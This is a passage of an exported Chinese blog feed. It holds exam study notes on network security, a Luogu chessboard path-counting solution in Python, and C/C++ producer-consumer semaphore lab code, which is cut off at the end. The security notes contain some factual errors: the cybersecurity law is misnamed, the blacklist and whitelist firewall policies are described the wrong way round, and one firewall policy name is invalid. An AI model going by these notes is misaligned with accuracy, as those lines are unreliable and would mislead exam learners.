<li><p>《中华人民共和国网络空间法》自<strong>2017年6月1日</strong>施行。</p>
</li>
<li><p>《中华人民共和国密码法》自<strong>2020年1月1日</strong>施行。</p>
</li>
<li><p><strong>安全审计</strong>属于安全管理中心。</p>
</li>
<li><p>现代操作系统提供的 金丝雀(Canary)漏洞缓解技术属于 <strong>堆栈保护</strong></p>
</li>
<li><p>对于受到治安管理处罚的人员，<strong>5年</strong> 内不得充实网络安全管理和网络安全运营关键岗位的工作。</p>
</li>
<li><p>网络攻击工具</p>
<blockquote>
<p>扫描器：扫描目标系统地址、端口、漏洞——NMAP、Nessus、Super Scan</p>
<p>远程监控：代理软件，控制“肉鸡”——-冰河、网络精灵、Netcat</p>
<p>网络嗅探：窃取、分析、破解网络信息——–Tcpdump、DSniff、WireShark</p>
<p>安全渗透工具箱：漏洞利用、特权提升——–Metasploit、BackTrack</p>
<p>密码破解：猜测、穷举、破解口令——–John the Ripper、LOphtCrack</p>
</blockquote>
</li>
<li><p>在移动应用App程序插入无关代码属于 <strong>防反编译</strong></p>
</li>
<li><p>域名地址和端口地址无法转换</p>
</li>
<li><p>DHCP协议（动态主机配置协议）</p>
</li>
<li><p>PKI公钥基础设施技术：CA(证书授权机构：证书的颁发、废除、更新；认证机构负责签发、管理、撤销一组终端用户证书)、RA(证书登记权威机构：证书注册和担保)</p>
</li>
<li><p>按照访问控制的对象进行分类，对文件读写进行访问控制属于操作系统访问控制。</p>
</li>
<li><p>操作系统访问控制有：文件读写、进程、内存等访问控制。</p>
</li>
<li><p>IIS对文件的NTFS许可权限管理属于 <strong>文件授权</strong></p>
</li>
<li><p>防火墙无法实现网络物理隔离</p>
</li>
<li><p>包过滤防火墙只能基于IP层过滤网站恶意包</p>
</li>
<li><p>VPN不能提供网络隔离服务</p>
</li>
<li><p>IPS主要安全功能不包括：网络物理隔离</p>
</li>
<li><p>数据链路层VPN的实现方式：ATM，Frame Relay，多协议标签交换MPLS</p>
</li>
<li><p>网络层VPN实现方式：受控路由过滤、隧道技术</p>
</li>
<li><p>传输层VPN实现方式：SSL技术</p>
</li>
<li><p>蜜罐为了实现一台计算机绑定多个IP地址，可以使用ARP协议实现。</p>
</li>
<li><p>物理断开技术需要保证不同安全域之间的网络 <strong>不能</strong> 以直接或间接的方式相连。</p>
</li>
<li><p>内外网路线切换器可以通过交换盒的开关设置控制计算机的网络物理连接。</p>
</li>
<li><p>文件传输审计主要针对FTP协议。</p>
</li>
<li><p>操作员 <strong>不能</strong>修改自己的操作记录。</p>
</li>
<li><p><strong>网络安全特权控制不完备</strong> 属于 <strong>非技术性安全漏洞</strong>。</p>
</li>
<li><p>在Linux系统中，可以用 <strong>lsof</strong> 工具检查进程使用的文件、TCP&#x2F;UDP端口、用户等信息。</p>
</li>
<li><p><strong>磁盘杀手病毒</strong> 属于引导性病毒</p>
</li>
<li><p>常见的引导性病毒：Boot.WYX 、磁盘杀手、AnitiExe病毒</p>
</li>
<li><p>网络蠕虫的四个功能模块：探测模块、传播模块、蠕虫引擎模块、负载模块。</p>
</li>
<li><p>Linux系统中 <strong>cmp</strong> 命令将二进制文件和原始发布介质上对应的文件进行比较。</p>
</li>
<li><p>网络安全取证步骤：取证现场保护–证据识别–传输证据–保存证据–分析证据–提交证据。</p>
</li>
<li><p>端口扫描中的 <strong>ID头信息扫描</strong> 需要第三方机器配合。</p>
</li>
<li><p>Windows中安全日志文件名为SecEvent.evt。</p>
</li>
<li><p>Apachee Httpd 配置文件中，负责基本读取文件控制的是access.conf。</p>
</li>
<li><p>在路由器配置时，使用Enable secret命令保存口令密文。</p>
</li>
<li><p>SSH由SSH传输层协议、SSH用户认证协议、SSH连接协议 构成。</p>
</li>
<li><p>PGP协议来保护电子邮件的安全。</p>
</li>
<li><p>PGP加密软件：<strong>密钥管理算法</strong> 和 <strong>数字签名算法</strong>都采用RSA，<strong>数据加密算法</strong>采用IDEA，<strong>完整性检测算法</strong> 和 <strong>数字签名算法</strong> 采用了MD5 和 RSA 以及随机数生成器。</p>
</li>
<li><p>黑名单策略：只允许符合安全规则的包通过，其他通信包禁止；policy ACCEPT</p>
</li>
<li><p>白名单策略：禁止与安全规则冲突的包通过防火墙，其他通信包都允许； policy REFUSE</p>
</li>
<li><p>网络地址转换方式有：静态NAT，NAT池，端口NAT(PAT)</p>
<blockquote>
<p>静态NAT：内部网络中每个主机都永久映射成外部网络中的某个合法地址</p>
<p>NAT池：在外部网络中配置合法地址集，采用动态分配的方法映射到内部网络</p>
<p>端口NAT：吧内部地址映射到外部网络的一个IP地址的不同端口上</p>
</blockquote>
</li>
<li><p>Snort入侵检测系统属于 <strong>基于规则的误用检测方法</strong>。</p>
</li>
<li><p>基于主机的入侵检测系统HIDS：网页防篡改系统、SWATCH、Tripwire</p>
</li>
<li><p>基于网络的入侵检测系统NIDS：国外[Session Wall , ISS RealSecure , Cisco Secure IDS];开源Snort。</p>
</li>
<li><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E.png" alt="安全漏洞"></p>
</li>
<li><p>僵尸网络是指攻击者利用入侵手段，将恶意代码植入目标计算机，进而操纵受害机执行恶意活动。</p>
</li>
<li><p>ICMP风暴和Smurf风暴攻击基于网络层ICMP协议的攻击。</p>
</li>
<li><p>UDP风暴基于传输层UDP的攻击。</p>
</li>
<li><p>SYN Flood攻击通过创建大量“半连接”攻击，TCP连接的三次握手中，第三次握手无法完成。</p>
</li>
<li><p>日志文件固定组成格式：时间标签，主机名，生成消息的子系统名称，消息。</p>
</li>
<li><p>SNMP权限分级机制不属于网络设备提供的SNMP访问措施。</p>
</li>
<li><p>允许远程攻击者不需要认证就执行命令属于 <strong>代码执行漏洞</strong>。</p>
</li>
<li><p>针对信息系统的访问控制包含三要素：主体、客体、访问控制</p>
</li>
<li><p>P2DR(动态安全模型)：防护(protection)、检测(detection)、响应(response)、安全策略(police)</p>
</li>
<li><p>PDRR模型：保护(protection),检测（detection），恢复（recovery），响应（response)</p>
</li>
</ol>
]]></content>
      <categories>
        <category>certificate</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>软考中级</tag>
      </tags>
  </entry>
  <entry>
    <title>洛谷算法</title>
    <url>/2025/02/10/%E6%B4%9B%E8%B0%B7%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h1 id="P1002-NOIP-2002-普及组-过河卒"><a href="#P1002-NOIP-2002-普及组-过河卒" class="headerlink" title="P1002 [NOIP 2002 普及组] 过河卒"></a>P1002 [NOIP 2002 普及组] 过河卒</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>棋盘上 $A$ 点有一个过河卒，需要走到目标 $B$ 点。卒行走的规则：可以向下、或者向右。同时在棋盘上 $C$ 点有一个对方的马，该马所在的点和所有跳跃一步可达的点称为对方马的控制点。因此称之为“马拦过河卒”。</p>
<p>棋盘用坐标表示，$A$ 点 $(0, 0)$、$B$ 点 $(n, m)$，同样马的位置坐标是需要给出的。</p>
<p><img lazyload src="/images/loading.svg" data-src="https://cdn.luogu.com.cn/upload/image_hosting/ipmwl52i.png" alt="demo_imge"></p>
<p>现在要求你计算出卒从 $A$ 点能够到达 $B$ 点的路径的条数，假设马的位置是固定不动的，并不是卒走一步马走一步。</p>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>一行四个正整数，分别表示 $B$ 点坐标和马的坐标。</p>
<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>一个整数，表示所有的路径条数。</p>
<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">6 6 3 3</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">6</span><br></pre></td></tr></table></figure></div>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>对于 $100 %$ 的数据，$1 \le n, m \le 20$，$0 \le$ 马的坐标 $\le 20$。</p>
<p><strong>【题目来源】</strong></p>
<p>NOIP 2002 普及组第四题</p>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#P1002</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_path</span>(<span class="params">n, m, horse_x, horse_y</span>):</span><br><span class="line">    <span class="comment"># 马的八个可能移动方向</span></span><br><span class="line">    moves = ((<span class="number">2</span>,<span class="number">1</span>), (<span class="number">2</span>,-<span class="number">1</span>), (-<span class="number">2</span>,<span class="number">1</span>), (-<span class="number">2</span>,-<span class="number">1</span>), (<span class="number">1</span>,<span class="number">2</span>), (<span class="number">1</span>,-<span class="number">2</span>), (-<span class="number">1</span>,<span class="number">2</span>), (-<span class="number">1</span>,-<span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建控制点集合</span></span><br><span class="line">    control_set = &#123;(horse_x + dx, horse_y + dy) <span class="keyword">for</span> dx, dy <span class="keyword">in</span> moves </span><br><span class="line">                   <span class="keyword">if</span> <span class="number">0</span> &lt;= horse_x + dx &lt;= n <span class="keyword">and</span> <span class="number">0</span> &lt;= horse_y + dy &lt;= m&#125;</span><br><span class="line">    control_set.add((horse_x, horse_y))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建dp数组，初始化为0</span></span><br><span class="line">    dp = [[<span class="number">0</span>] * (m + <span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n + <span class="number">1</span>)]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 设置起点</span></span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span> <span class="keyword">if</span> (<span class="number">0</span>, <span class="number">0</span>) <span class="keyword">not</span> <span class="keyword">in</span> control_set <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 动态规划计算路径数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> (i, j) <span class="keyword">not</span> <span class="keyword">in</span> control_set:  <span class="comment"># 如果当前点不在马的控制范围内</span></span><br><span class="line">                <span class="keyword">if</span> i &gt; <span class="number">0</span>:  <span class="comment"># 从上方来</span></span><br><span class="line">                    dp[i][j] += dp[i-<span class="number">1</span>][j]</span><br><span class="line">                <span class="keyword">if</span> j &gt; <span class="number">0</span>:  <span class="comment"># 从左方来</span></span><br><span class="line">                    dp[i][j] += dp[i][j-<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> dp[n][m]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_input</span>(<span class="params">n, m, horse_x, horse_y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;检查输入数据是否在有效范围内&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">1</span> &lt;= n &lt;= <span class="number">20</span> <span class="keyword">and</span> <span class="number">1</span> &lt;= m &lt;= <span class="number">20</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;棋盘大小超出范围！n和m应在1-20之间&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt;= horse_x &lt;= n <span class="keyword">and</span> <span class="number">0</span> &lt;= horse_y &lt;= m):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;马的位置超出棋盘范围！&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提供输入提示</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;请输入棋盘大小(n,m)和马的位置(x,y)，用空格分隔&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;数据范围：1 ≤ n,m ≤ 20；马的位置不能超出棋盘范围&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;示例：6 6 3 3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 读取输入</span></span><br><span class="line">    n, m, horse_x, horse_y = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查输入数据范围</span></span><br><span class="line">    valid, error_msg = check_input(n, m, horse_x, horse_y)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">        <span class="built_in">print</span>(error_msg)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 计算并输出结果</span></span><br><span class="line">        result = calculate_path(n, m, horse_x, horse_y)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;从(0,0)到(<span class="subst">&#123;n&#125;</span>,<span class="subst">&#123;m&#125;</span>)的路径数为：<span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入格式错误！请输入4个整数，用空格分隔&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;发生错误：<span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>生产者_消费者问题[操作系统]</title>
    <url>/2024/10/08/%E7%94%9F%E4%BA%A7%E8%80%85-%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h2 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h2><blockquote>
<p>描述：</p>
<p>利用C++&#x2F;C实现多线程的生产者-消费者问题。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;mutex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> goods = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> maxx = <span class="number">100</span>;</span><br><span class="line">mutex suo;</span><br><span class="line">mutex printr;</span><br><span class="line"><span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">producter</span><span class="params">(<span class="type">char</span> name)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> need = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(flag) <span class="keyword">return</span>;</span><br><span class="line">		need = (<span class="built_in">rand</span>() +<span class="number">1</span>) % <span class="number">10</span>;</span><br><span class="line">		suo.<span class="built_in">lock</span>();</span><br><span class="line">		<span class="keyword">if</span>(goods + need &lt;= maxx)&#123;</span><br><span class="line">			goods += need;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			need = maxx - goods;</span><br><span class="line">			goods = maxx;</span><br><span class="line">		&#125;</span><br><span class="line">		suo.<span class="built_in">unlock</span>();</span><br><span class="line">		</span><br><span class="line">		printr.<span class="built_in">lock</span>();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c生产者生产了%d商品，货架上有%d件商品\n&quot;</span>,name,need,goods);</span><br><span class="line">		<span class="keyword">if</span>(goods == maxx) <span class="built_in">printf</span>(<span class="string">&quot;货架已满\n&quot;</span>);</span><br><span class="line">		printr.<span class="built_in">unlock</span>();</span><br><span class="line">		</span><br><span class="line">		std::this_thread::<span class="built_in">sleep_for</span>(std::chrono::<span class="built_in">milliseconds</span>(<span class="number">50</span>)); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">consumer</span><span class="params">(<span class="type">char</span> name)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> need = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(flag) <span class="keyword">return</span>;</span><br><span class="line">		need = (<span class="built_in">rand</span>() +<span class="number">1</span>) % <span class="number">10</span>;</span><br><span class="line">		suo.<span class="built_in">lock</span>();</span><br><span class="line">		<span class="keyword">if</span>(goods - need &gt; <span class="number">0</span>)&#123;</span><br><span class="line">			goods -= need;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			need = goods;</span><br><span class="line">			goods = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		suo.<span class="built_in">unlock</span>();</span><br><span class="line">		</span><br><span class="line">		printr.<span class="built_in">lock</span>();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c消费者消费了%d商品，货架上有%d件商品\n&quot;</span>, name,need,goods);</span><br><span class="line">		<span class="keyword">if</span>(goods == <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;货架已空\n&quot;</span>);</span><br><span class="line">		printr.<span class="built_in">unlock</span>();</span><br><span class="line">		</span><br><span class="line">		std::this_thread::<span class="built_in">sleep_for</span>(std::chrono::<span class="built_in">milliseconds</span>(<span class="number">50</span>)); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">	<span class="function">thread <span class="title">pa</span><span class="params">(&amp;producter,<span class="string">&#x27;A&#x27;</span>)</span></span>;</span><br><span class="line">	<span class="function">thread <span class="title">pb</span><span class="params">(&amp;producter,<span class="string">&#x27;B&#x27;</span>)</span></span>;</span><br><span class="line">	<span class="function">thread <span class="title">pc</span><span class="params">(&amp;producter,<span class="string">&#x27;C&#x27;</span>)</span></span>;</span><br><span class="line">	<span class="function">thread <span class="title">pd</span><span class="params">(&amp;producter,<span class="string">&#x27;D&#x27;</span>)</span></span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function">thread <span class="title">ca</span><span class="params">(&amp;consumer,<span class="string">&#x27;A&#x27;</span>)</span></span>;</span><br><span class="line">	<span class="function">thread <span class="title">cb</span><span class="params">(&amp;consumer,<span class="string">&#x27;B&#x27;</span>)</span></span>;</span><br><span class="line">	<span class="function">thread <span class="title">cc</span><span class="params">(&amp;consumer,<span class="string">&#x27;C&#x27;</span>)</span></span>;</span><br><span class="line">	<span class="function">thread <span class="title">cd</span><span class="params">(&amp;consumer,<span class="string">&#x27;D&#x27;</span>)</span></span>;</span><br><span class="line">	</span><br><span class="line">	<span class="type">char</span> cinp;</span><br><span class="line">	<span class="keyword">while</span>(cin&gt;&gt;cinp )&#123;</span><br><span class="line">		<span class="keyword">if</span>(cinp==<span class="string">&#x27;A&#x27;</span>) <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	flag = <span class="literal">true</span>;</span><br><span class="line">	pa.<span class="built_in">join</span>();</span><br><span class="line">	pb.<span class="built_in">join</span>();</span><br><span class="line">	pc.<span class="built_in">join</span>();</span><br><span class="line">	pd.<span class="built_in">join</span>();</span><br><span class="line">	</span><br><span class="line">	ca.<span class="built_in">join</span>();</span><br><span class="line">	cb.<span class="built_in">join</span>();</span><br><span class="line">	cc.<span class="built_in">join</span>();</span><br><span class="line">	cd.<span class="built_in">join</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h2 id="记录型信号量机制"><a href="#记录型信号量机制" class="headerlink" title="记录型信号量机制"></a>记录型信号量机制</h2><blockquote>
<p>利用记录型信号量机制解决生产者——消费者问题</p>
<p>在windows系统上实现</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//记录型信号量</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>  </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 10  <span class="comment">// 缓冲区大小  </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITEMS 20    <span class="comment">// 生产者生产的最大项目数  </span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局变量  </span></span><br><span class="line"><span class="type">int</span> buffer[BUFFER_SIZE];  <span class="comment">// 缓冲区数组  </span></span><br><span class="line"><span class="type">int</span> in = <span class="number">0</span>;               <span class="comment">// 下一个生产者将放入数据的位置  </span></span><br><span class="line"><span class="type">int</span> out = <span class="number">0</span>;              <span class="comment">// 下一个消费者将取出数据的位置  </span></span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;            <span class="comment">// 缓冲区中当前项目的数量  </span></span><br><span class="line">HANDLE semEmpty;          <span class="comment">// empty;HEADLE 相当于 void*</span></span><br><span class="line">HANDLE semFull;           <span class="comment">// full;  </span></span><br><span class="line">HANDLE mutex;             </span><br><span class="line"><span class="keyword">volatile</span> BOOL stop = FALSE; <span class="comment">// 用于停止消费者线程的标志  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 生产者线程函数  </span></span><br><span class="line">DWORD WINAPI <span class="title function_">Producer</span><span class="params">(LPVOID lpParam)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_ITEMS; i++) &#123;</span><br><span class="line">        <span class="comment">// 是否有空的缓冲区</span></span><br><span class="line">        WaitForSingleObject(semEmpty, INFINITE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 缓冲池是否空闲  </span></span><br><span class="line">        WaitForSingleObject(mutex, INFINITE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将数据放入缓冲区  </span></span><br><span class="line">        buffer[in] = i;</span><br><span class="line">        in = (in + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">        count++;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 释放互斥锁</span></span><br><span class="line">        ReleaseMutex(mutex);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通知消费者缓冲区中有新项目  </span></span><br><span class="line">        ReleaseSemaphore(semFull, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟生产一个项目所需的时间  </span></span><br><span class="line">        Sleep(<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    stop = TRUE;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 消费者线程函数  </span></span><br><span class="line">DWORD WINAPI <span class="title function_">Consumer</span><span class="params">(LPVOID lpParam)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">        <span class="comment">// 等待缓冲区有项目  </span></span><br><span class="line">        WaitForSingleObject(semFull, INFINITE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 缓冲池是否有空闲</span></span><br><span class="line">        WaitForSingleObject(mutex, INFINITE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查是否应该停止（在生产者线程完成后）  </span></span><br><span class="line">        <span class="keyword">if</span> (stop &amp;&amp; count == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果生产者已经停止并且缓冲区为空，则退出循环  </span></span><br><span class="line">            ReleaseMutex(mutex);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从缓冲区取出项目  </span></span><br><span class="line">        <span class="type">int</span> item = buffer[out];</span><br><span class="line">        out = (out + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">        count--;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 释放互斥锁  </span></span><br><span class="line">        ReleaseMutex(mutex);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 处理项目（这里只是简单地打印）  </span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Consumed: %d\n&quot;</span>, item);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通知生产者缓冲区有空位  </span></span><br><span class="line">        ReleaseSemaphore(semEmpty, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟消费一个项目所需的时间  </span></span><br><span class="line">        Sleep(<span class="number">150</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 初始化信号量和互斥锁  </span></span><br><span class="line">    semEmpty = CreateSemaphore(<span class="literal">NULL</span>, BUFFER_SIZE, BUFFER_SIZE, <span class="literal">NULL</span>);</span><br><span class="line">    semFull = CreateSemaphore(<span class="literal">NULL</span>, <span class="number">0</span>, BUFFER_SIZE, <span class="literal">NULL</span>);</span><br><span class="line">    mutex = CreateMutex(<span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建生产者和消费者线程  </span></span><br><span class="line">    HANDLE hProducer = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, Producer, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    HANDLE hConsumer = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, Consumer, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待生产者线程结束  </span></span><br><span class="line">    WaitForSingleObject(hProducer, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待消费者线程结束（确保所有项目都被消费）  </span></span><br><span class="line">    <span class="comment">// 注意：由于我们使用了stop标志和count变量来确保消费者线程在适当的时候停止，  </span></span><br><span class="line">    <span class="comment">// 所以这里我们只需要等待消费者线程自然结束即可。  </span></span><br><span class="line">    WaitForSingleObject(hConsumer, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理资源  </span></span><br><span class="line">    CloseHandle(semEmpty);</span><br><span class="line">    CloseHandle(semFull);</span><br><span class="line">    CloseHandle(mutex);</span><br><span class="line">    CloseHandle(hProducer);</span><br><span class="line">    CloseHandle(hConsumer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="AND型信号量机制"><a href="#AND型信号量机制" class="headerlink" title="AND型信号量机制"></a>AND型信号量机制</h2><blockquote>
<p>描述：</p>
<p>​			利用AND型信号量机制解决一个进程需要获得两个或多个的共享资源后才能执行其任务的生产者——消费者问题</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 10</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> buffer[BUFFER_SIZE]; <span class="comment">// 共享缓冲区</span></span><br><span class="line"><span class="type">int</span> in = <span class="number">0</span>;              <span class="comment">// 生产者使用的索引</span></span><br><span class="line"><span class="type">int</span> out = <span class="number">0</span>;             <span class="comment">// 消费者使用的索引</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 信号量</span></span><br><span class="line"><span class="type">sem_t</span> empty, full;</span><br><span class="line"><span class="type">sem_t</span> mutex;</span><br><span class="line"></span><br><span class="line"><span 